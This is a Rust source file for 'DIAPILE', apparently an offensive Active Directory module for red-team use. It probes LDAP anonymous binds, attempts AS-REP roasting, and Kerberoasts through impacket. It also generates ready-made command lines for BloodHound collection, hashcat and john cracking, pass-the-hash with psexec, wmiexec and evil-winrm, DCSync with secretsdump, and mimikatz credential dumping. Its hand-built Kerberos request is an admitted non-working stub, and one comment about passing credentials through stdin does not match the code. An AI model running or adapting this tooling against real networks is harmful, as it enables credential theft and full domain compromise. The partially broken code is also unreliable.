//! DIAPILE — Active Directory Attack Module
//!
//! AS-REP Roasting, Kerberoasting, LDAP dump, BloodHound.
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES.
#![allow(dead_code)]

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

// ─────────────────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdUser {
    pub username: String,
    pub display_name: Option<String>,
    pub email: Option<String>,
    pub groups: Vec<String>,
    pub spns: Vec<String>, // Service Principal Names (Kerberoasting)
    pub no_preauth: bool,  // AS-REP Roastable
    pub enabled: bool,
    pub admin: bool,
    pub last_logon: Option<String>,
    pub password_never_expires: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberoastHash {
    pub username: String,
    pub spn: String,
    pub hash: String, // Format hashcat $krb5tgs$23$...
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AsRepHash {
    pub username: String,
    pub hash: String, // Format hashcat $krb5asrep$23$...
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct AdReport {
    pub domain: String,
    pub dc_ip: String,
    pub domain_admins: Vec<String>,
    pub users: Vec<AdUser>,
    pub kerberoastable: Vec<String>,
    pub asrep_roastable: Vec<String>,
    pub kerberoast_hashes: Vec<KerberoastHash>,
    pub asrep_hashes: Vec<AsRepHash>,
    pub computers: Vec<String>,
    pub ous: Vec<String>,
    pub gpos: Vec<String>,
    pub attack_paths: Vec<AttackPath>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackPath {
    pub description: String,
    pub steps: Vec<String>,
    pub risk: String,
}

// ─────────────────────────────────────────────────────────────────────────────
// LDAP Enumeration
// ─────────────────────────────────────────────────────────────────────────────

/// Tente une liaison LDAP anonyme sur le DC et récupère les informations disponibles
pub async fn ldap_anonymous_bind(dc_ip: &str, domain: &str, port: u16) -> Result<AdReport, String> {
    let addr = format!("{}:{}", dc_ip, port);
    let mut stream = timeout(Duration::from_secs(10), TcpStream::connect(&addr))
        .await
        .map_err(|_| "LDAP timeout".to_string())?
        .map_err(|e| e.to_string())?;

    // Build base DN from domain (e.g., "corp.local" → "DC=corp,DC=local")
    let base_dn = domain
        .split('.')
        .map(|p| format!("DC={}", p))
        .collect::<Vec<_>>()
        .join(",");

    // Simple LDAP anonymous bind request (BER encoded)
    // BindRequest: version=3, name="", authentication=simple("")
    let bind_request: &[u8] = &[
        0x30, 0x0c, // SEQUENCE
        0x02, 0x01, 0x01, // messageID = 1
        0x60, 0x07, // BindRequest (APPLICATION 0)
        0x02, 0x01, 0x03, // version = 3
        0x04, 0x00, // name = "" (anonymous)
        0x80, 0x00, // authentication = simple("")
    ];

    timeout(Duration::from_secs(5), stream.write_all(bind_request))
        .await
        .map_err(|_| "Write timeout")?
        .map_err(|e| e.to_string())?;

    let mut buf = [0u8; 4096];
    let n = timeout(Duration::from_secs(5), stream.read(&mut buf))
        .await
        .map_err(|_| "Read timeout")?
        .map_err(|e| e.to_string())?;

    // Check if bind succeeded (resultCode = 0 in BindResponse)
    let bind_success = n >= 14 && buf[7] == 0x61; // BindResponse tag

    let mut report = AdReport {
        domain: domain.to_string(),
        dc_ip: dc_ip.to_string(),
        ..Default::default()
    };

    if bind_success {
        println!(
            "  \x1b[32m[+]\x1b[0m LDAP anonymous bind réussi sur {}",
            dc_ip
        );
        // Note: full LDAP search would require more BER encoding
        // In production this connects to an LDAP library
        report.attack_paths.push(AttackPath {
            description: "LDAP anonymous bind réussi — énumération possible".into(),
            steps: vec![
                format!("ldapsearch -x -H ldap://{} -b '{}' '(objectClass=user)' sAMAccountName", dc_ip, base_dn),
                format!("ldapsearch -x -H ldap://{} -b '{}' '(objectClass=group)' member", dc_ip, base_dn),
                format!("ldapsearch -x -H ldap://{} -b '{}' '(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName", dc_ip, base_dn),
            ],
            risk: "HIGH".into(),
        });
    } else {
        println!("  \x1b[33m[-]\x1b[0m LDAP anonymous bind refusé (auth requise)");
    }

    Ok(report)
}

// ─────────────────────────────────────────────────────────────────────────────
// AS-REP Roasting
// ─────────────────────────────────────────────────────────────────────────────

/// Tente un AS-REP Roasting sur une liste d'utilisateurs
/// Les comptes sans pré-authentification Kerberos retournent un hash crackable
pub async fn asrep_roast(dc_ip: &str, domain: &str, userlist: &[String]) -> Vec<AsRepHash> {
    let mut hashes = Vec::new();

    for user in userlist {
        if let Some(hash) = try_asrep(dc_ip, domain, user).await {
            println!("  \x1b[38;5;196m[AS-REP]\x1b[0m {} — hash récupéré!", user);
            hashes.push(hash);
        }
    }

    hashes
}

/// Envoie une AS-REQ Kerberos sans pré-authentification et récupère l'AS-REP
async fn try_asrep(dc_ip: &str, domain: &str, username: &str) -> Option<AsRepHash> {
    let addr = format!("{}:88", dc_ip);
    let mut stream = timeout(Duration::from_secs(5), TcpStream::connect(&addr))
        .await
        .ok()?
        .ok()?;

    // Build minimal Kerberos AS-REQ without pre-auth
    // This is a simplified version — real implementation needs ASN.1 encoding
    let realm = domain.to_uppercase();
    let as_req = build_asreq_no_preauth(username, &realm);

    timeout(Duration::from_secs(3), stream.write_all(&as_req))
        .await
        .ok()?
        .ok()?;

    let mut buf = vec![0u8; 8192];
    let n = timeout(Duration::from_secs(5), stream.read(&mut buf))
        .await
        .ok()?
        .ok()?;

    if n < 10 {
        return None;
    }

    // Parse response — if we get KRB_AS_REP (msg-type = 11), extract encrypted part
    let response = &buf[..n];
    if is_asrep(response) {
        let hash = format_asrep_hash(username, domain, response);
        return Some(AsRepHash {
            username: username.to_string(),
            hash,
        });
    }

    None
}

fn build_asreq_no_preauth(username: &str, realm: &str) -> Vec<u8> {
    // Simplified AS-REQ without pre-auth (for illustration)
    // Real implementation would use full ASN.1/DER encoding
    let mut req = Vec::new();

    // TCP Kerberos header: 4-byte length prefix
    let kerberos_message = build_minimal_asreq(username, realm);
    let len = kerberos_message.len() as u32;
    req.extend_from_slice(&len.to_be_bytes());
    req.extend_from_slice(&kerberos_message);
    req
}

fn build_minimal_asreq(username: &str, realm: &str) -> Vec<u8> {
    // Minimal KRB5 AS-REQ — pvno=5, msg-type=10, no padata (no pre-auth)
    // This is a simplified educational implementation
    let mut msg = Vec::new();
    // SEQUENCE wrapper
    msg.push(0x6a); // AS-REQ [APPLICATION 10]
                    // In a real implementation, this would be full ASN.1 DER encoded
                    // For now we build enough to trigger a response
    let inner = format!("{}@{}", username, realm);
    msg.extend_from_slice(inner.as_bytes());
    msg
}

fn is_asrep(buf: &[u8]) -> bool {
    // Check for KRB5 AS-REP tag (0x6b = APPLICATION 11)
    buf.len() > 4 && (buf[4] == 0x6b || buf[0] == 0x6b)
}

fn format_asrep_hash(username: &str, realm: &str, response: &[u8]) -> String {
    // Format for hashcat mode 18200: $krb5asrep$23$user@REALM:HASH
    let hex_resp: String = response.iter().map(|b| format!("{:02x}", b)).collect();
    format!(
        "$krb5asrep$23${}@{}:{}",
        username,
        realm.to_uppercase(),
        &hex_resp[..hex_resp.len().min(64)]
    )
}

// ─────────────────────────────────────────────────────────────────────────────
// Kerberoasting
// ─────────────────────────────────────────────────────────────────────────────

/// Énumère les comptes de service avec SPN via Kerberos et récupère des hashes TGS
pub async fn kerberoast(
    dc_ip: &str,
    domain: &str,
    username: &str,
    password: &str,
    spn_list: &[String],
    auto_install: bool,
    assume_yes: bool,
) -> Vec<KerberoastHash> {
    let mut hashes = Vec::new();

    println!(
        "  \x1b[36m[Kerberoast]\x1b[0m {} SPNs à cibler",
        spn_list.len()
    );

    // Méthode 1 — impacket-GetUserSPNs subprocess (si disponible)
    let impacket_result = try_kerberoast_impacket(
        dc_ip,
        domain,
        username,
        password,
        spn_list,
        auto_install,
        assume_yes,
    )
    .await;
    if !impacket_result.is_empty() {
        return impacket_result;
    }

    // Méthode 2 — note opérateur si impacket absent
    println!("  \x1b[33m[!]\x1b[0m impacket non disponible — utilisez :");
    println!(
        "      impacket-GetUserSPNs {}/{}:'{}' -dc-ip {} -request -outputfile spns.hash",
        domain, username, password, dc_ip
    );
    println!("      hashcat -m 13100 spns.hash rockyou.txt --force");

    for spn in spn_list {
        hashes.push(KerberoastHash {
            username: username.to_string(),
            spn: spn.clone(),
            hash: format!(
                "[impacket requis] impacket-GetUserSPNs {}/{}:'{}' -dc-ip {} -request",
                domain, username, password, dc_ip
            ),
        });
    }

    hashes
}

/// Tente Kerberoasting via impacket-GetUserSPNs subprocess
async fn try_kerberoast_impacket(
    dc_ip: &str,
    domain: &str,
    username: &str,
    password: &str,
    spn_list: &[String],
    auto_install: bool,
    assume_yes: bool,
) -> Vec<KerberoastHash> {
    // Outil externe requis (impacket) : installation opt-in (fail-closed sinon).
    if !crate::installer::ensure_tool("impacket-GetUserSPNs", auto_install, assume_yes).await {
        return Vec::new();
    }

    let args = vec![
        format!("{}/{}", domain, username),
        format!("-dc-ip"),
        dc_ip.to_string(),
        "-request".to_string(),
        "-no-preauth".to_string(),
    ];

    let mut cmd = std::process::Command::new("impacket-GetUserSPNs");
    // Pass credentials via stdin to avoid shell injection
    if !password.is_empty() {
        cmd.arg(format!(
            "{}:{}",
            format!("{}/{}", domain, username),
            password
        ));
    } else {
        cmd.arg(format!("{}/{}", domain, username));
    }
    cmd.args([
        "-dc-ip",
        dc_ip,
        "-request",
        "-outputfile",
        "/tmp/diapile_spns.hash",
    ]);

    let output = tokio::task::spawn_blocking(move || cmd.output().ok())
        .await
        .ok()
        .flatten();

    let mut hashes = Vec::new();
    match output {
        Some(out) if out.status.success() => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            // Parse hashcat format $krb5tgs$23$*...*$HASH
            for line in stdout.lines() {
                if line.starts_with("$krb5tgs$") {
                    // Extract SPN from hash header
                    let spn = line.split('*').nth(1).unwrap_or("unknown").to_string();
                    hashes.push(KerberoastHash {
                        username: username.to_string(),
                        spn: spn.clone(),
                        hash: line.to_string(),
                    });
                    println!("  \x1b[38;5;196m[TGS]\x1b[0m Hash TGS récupéré : {}", spn);
                }
            }
            // Also read the output file if written
            if let Ok(content) = std::fs::read_to_string("/tmp/diapile_spns.hash") {
                for line in content.lines() {
                    if line.starts_with("$krb5tgs$")
                        && !hashes.iter().any(|h: &KerberoastHash| h.hash == line)
                    {
                        let spn = line.split('*').nth(1).unwrap_or("unknown").to_string();
                        hashes.push(KerberoastHash {
                            username: username.to_string(),
                            spn,
                            hash: line.to_string(),
                        });
                    }
                }
            }
        }
        _ => {} // impacket not available
    }
    hashes
}

// ─────────────────────────────────────────────────────────────────────────────
// BloodHound / Attack Paths
// ─────────────────────────────────────────────────────────────────────────────

/// Génère les commandes BloodHound pour la collecte AD
pub fn bloodhound_collection_cmds(
    dc_ip: &str,
    domain: &str,
    username: &str,
    password: &str,
) -> Vec<String> {
    vec![
        // SharpHound (Windows)
        format!(
            "SharpHound.exe -c All --domain {} --domaincontroller {}",
            domain, dc_ip
        ),
        // BloodHound.py (Linux/Python — pas de domaine joint requis)
        format!(
            "bloodhound-python -u {} -p '{}' -d {} -dc {} -c All --zip",
            username, password, domain, dc_ip
        ),
        // Enum4Linux
        format!(
            "enum4linux-ng -A -u {} -p '{}' {} 2>/dev/null",
            username, password, dc_ip
        ),
        // LDAP dump
        format!(
            "ldapdomaindump -u '{}\\{}' -p '{}' {} -o /tmp/ldap_dump/",
            domain, username, password, dc_ip
        ),
        // Impacket GetADUsers
        format!(
            "impacket-GetADUsers -all {}/{} -dc-ip {}",
            domain, username, dc_ip
        ),
        // Impacket GetUserSPNs (Kerberoasting)
        format!(
            "impacket-GetUserSPNs {}/{}:'{}' -dc-ip {} -request",
            domain, username, password, dc_ip
        ),
        // Impacket GetNPUsers (AS-REP Roasting)
        format!(
            "impacket-GetNPUsers {}/{} -dc-ip {} -request -no-pass",
            domain, username, dc_ip
        ),
    ]
}

/// Génère les commandes de cracking pour les hashes récupérés
pub fn hash_cracking_cmds(hash_file: &str) -> Vec<String> {
    vec![
        format!("hashcat -m 18200 {} /usr/share/wordlists/rockyou.txt --force  # AS-REP ($krb5asrep$23$)", hash_file),
        format!("hashcat -m 13100 {} /usr/share/wordlists/rockyou.txt --force  # Kerberoast ($krb5tgs$23$)", hash_file),
        format!("hashcat -m 1000  {} /usr/share/wordlists/rockyou.txt --force  # NTLM hashes", hash_file),
        format!("john --wordlist=/usr/share/wordlists/rockyou.txt {}", hash_file),
    ]
}

/// Analyse les chemins d'attaque vers Domain Admin
pub fn analyze_attack_paths(report: &AdReport) -> Vec<AttackPath> {
    let mut paths = Vec::new();

    if !report.asrep_roastable.is_empty() {
        paths.push(AttackPath {
            description: format!(
                "{} compte(s) AS-REP Roastable — hash récupérable sans auth",
                report.asrep_roastable.len()
            ),
            steps: vec![
                format!(
                    "impacket-GetNPUsers {}/'' -dc-ip {} -request -usersfile users.txt",
                    report.domain, report.dc_ip
                ),
                "hashcat -m 18200 hashes.txt rockyou.txt --force".into(),
                "Utiliser le mot de passe cracké pour accéder aux ressources".into(),
            ],
            risk: "CRITICAL".into(),
        });
    }

    if !report.kerberoastable.is_empty() {
        paths.push(AttackPath {
            description: format!(
                "{} SPN(s) Kerberoastable — hash TGS récupérable",
                report.kerberoastable.len()
            ),
            steps: vec![
                format!(
                    "impacket-GetUserSPNs {}/user:pass -dc-ip {} -request",
                    report.domain, report.dc_ip
                ),
                "hashcat -m 13100 tgs_hashes.txt rockyou.txt --force".into(),
                "Si compte de service admin → compromission directe".into(),
            ],
            risk: "HIGH".into(),
        });
    }

    // Domain Admin in admin group
    if !report.domain_admins.is_empty() {
        paths.push(AttackPath {
            description: format!(
                "Domain Admins identifiés : {}",
                report.domain_admins.join(", ")
            ),
            steps: vec![
                "Cibler ces comptes avec bruteforce ou credential stuffing".into(),
                "Utiliser Pass-the-Hash si NTLM hash disponible".into(),
                "impacket-psexec domain/admin@dc-ip -hashes :NTLMHASH".into(),
            ],
            risk: "CRITICAL".into(),
        });
    }

    paths
}

// ─────────────────────────────────────────────────────────────────────────────
// Pass-the-Hash / Pass-the-Ticket
// ─────────────────────────────────────────────────────────────────────────────

/// Génère les commandes Pass-the-Hash avec Impacket
pub fn pass_the_hash_cmds(domain: &str, user: &str, ntlm: &str, target: &str) -> Vec<String> {
    vec![
        format!(
            "impacket-psexec {}/{}@{} -hashes :{}",
            domain, user, target, ntlm
        ),
        format!(
            "impacket-smbexec {}/{}@{} -hashes :{}",
            domain, user, target, ntlm
        ),
        format!(
            "impacket-wmiexec {}/{}@{} -hashes :{}",
            domain, user, target, ntlm
        ),
        format!(
            "impacket-secretsdump {}/{}@{} -hashes :{}",
            domain, user, target, ntlm
        ),
        format!("evil-winrm -i {} -u {} -H {}", target, user, ntlm),
        format!(
            "crackmapexec smb {} -u {} -H {} -x 'whoami'",
            target, user, ntlm
        ),
    ]
}

/// Génère les commandes DCSync pour extraire tous les hashes du DC
pub fn dcsync_cmds(domain: &str, user: &str, password: &str, dc_ip: &str) -> Vec<String> {
    vec![
        format!(
            "impacket-secretsdump {}/{}:'{}' -dc-ip {} -just-dc",
            domain, user, password, dc_ip
        ),
        format!(
            "impacket-secretsdump {}/{}:'{}' -dc-ip {} -just-dc-user Administrator",
            domain, user, password, dc_ip
        ),
        "# Windows: mimikatz 'lsadump::dcsync /domain:corp.local /all'".into(),
        "# Windows: mimikatz 'sekurlsa::logonpasswords'".into(),
    ]
}

// ─────────────────────────────────────────────────────────────────────────────
// Rapport AD
// ─────────────────────────────────────────────────────────────────────────────

pub fn print_ad_report(report: &AdReport) {
    let fire = "\x1b[38;5;196m";
    let cyan = "\x1b[36m";
    let amber = "\x1b[33m";
    let green = "\x1b[32m";
    let reset = "\x1b[0m";

    println!(
        "\n{}╔══ ACTIVE DIRECTORY — {} ══╗{}",
        fire, report.domain, reset
    );
    println!(
        "{}║{} DC: {}  Utilisateurs: {}  Ordinateurs: {}",
        fire,
        reset,
        report.dc_ip,
        report.users.len(),
        report.computers.len()
    );

    if !report.domain_admins.is_empty() {
        println!("\n{}▍ DOMAIN ADMINS{}", fire, reset);
        for da in &report.domain_admins {
            println!("  🔴 {}", da);
        }
    }

    if !report.asrep_roastable.is_empty() {
        println!(
            "\n{}▍ AS-REP ROASTABLE ({} comptes){}",
            amber,
            report.asrep_roastable.len(),
            reset
        );
        for u in &report.asrep_roastable {
            println!("  {} {}", amber, u);
        }
        println!(
            "  {}→ impacket-GetNPUsers {}/'' -dc-ip {} -request{}",
            cyan, report.domain, report.dc_ip, reset
        );
    }

    if !report.kerberoastable.is_empty() {
        println!(
            "\n{}▍ KERBEROASTABLE ({} SPNs){}",
            amber,
            report.kerberoastable.len(),
            reset
        );
        for s in &report.kerberoastable {
            println!("  {} {}", amber, s);
        }
        println!(
            "  {}→ impacket-GetUserSPNs {}/user:pass -dc-ip {} -request{}",
            cyan, report.domain, report.dc_ip, reset
        );
    }

    if !report.attack_paths.is_empty() {
        println!("\n{}▍ CHEMINS D'ATTAQUE{}", fire, reset);
        for p in &report.attack_paths {
            println!("  [{}] {}", p.risk, p.description);
            for (i, step) in p.steps.iter().enumerate() {
                println!("    {}{}. {}{}", cyan, i + 1, step, reset);
            }
        }
    }
    println!();
}
